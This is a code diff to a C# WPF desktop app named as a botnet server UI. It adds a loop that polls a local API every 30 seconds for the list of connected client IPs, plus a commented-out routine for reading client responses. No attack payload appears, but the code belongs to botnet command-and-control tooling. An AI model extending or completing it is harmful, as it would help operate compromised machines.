@@ -6,6 +6,7 @@ using System.Net.Http;
 using System.Net.Http.Headers;
 using System.Net.Sockets;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
@@ -74,6 +75,7 @@ namespace BotNet_Server_UI
         private async void Formloaded(object sender, RoutedEventArgs e)
         {
             _ = await ApiRequest.DeleteProductsAsync("api/v1/messages");
+            _ = await ApiRequest.DeleteProductsAsync("api/v1/responses");
             textBoxes.Add(IP1);
             textBoxes.Add(IP2);
             textBoxes.Add(IP3);
@@ -103,13 +105,7 @@ namespace BotNet_Server_UI
             textBoxes.Add(IP27);
             textBoxes.Add(IP28);
             UpdateTextBoxes();
-            var arr = await ApiRequest.GetProductAsync<IP[]>("/api/v1/ip");
-            string res = "";
-            for (int i = 0; i < arr.Length; i++)
-            {
-                res += arr[i].ip + "\n";
-            }
-            ClientList.Text = res;
+            StartListenAsync();
         }
 
         private void Minus_Click(object sender, RoutedEventArgs e)
@@ -157,5 +153,59 @@ namespace BotNet_Server_UI
             };
             _ = await ApiRequest.CreateProductAsync(response, "responses/192.168.0.1");
         }
+
+        private async void StartListenAsync()
+        {
+            await Task.Run(() => ListenClients());
+        }
+
+        private async void ListenClients()
+        {
+            try
+            {
+                while (true)
+                {
+                    var arr = await ApiRequest.GetProductAsync<IP[]>("/api/v1/ip");
+                    string res = "";
+                    for (int i = 0; i < arr.Length; i++)
+                    {
+                        res += arr[i].ip + "\n";
+                    }
+                    await ClientList.Dispatcher.BeginInvoke(new Action(() => ClientList.Text = res));
+                    Thread.Sleep(30000);
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+        }
+
+        //private async void ListenResponses()
+        //{
+        //    while (true)
+        //    {
+        //        Responses[] responses = await ApiRequest.GetProductAsync<Responses[]>("api/v1/responses");
+        //        uint[] vars = new uint[responses.Length];
+        //        for (int i = 0; i < responses.Length; i++)
+        //        {
+        //            vars[i] = await ApiRequest.GetProductAsync<uint>($"api/v1/responses/{responses[i].ip}");
+        //        }
+        //        for (int i = 0; i < responses.Length; i++)
+        //        {
+        //            uint var1 = await ApiRequest.GetProductAsync<uint>($"api/v1/responses/{responses[i].ip}") - 1;
+        //            if (var1 != vars[i])
+        //            {
+        //                continue;
+        //            }
+        //            Response response = await ApiRequest.GetProductAsync<Response>($"api/v1/responses/{responses[i].ip}/{var1}");
+        //            if (response != null)
+        //            {
+        //                await LogPanel.Dispatcher.BeginInvoke(new Action(() => LogPanel.Text += response.response));
+        //            }
+        //        }
+        //        Thread.Sleep(1000);
+        //    }
+        //} // to delete
     }
 }
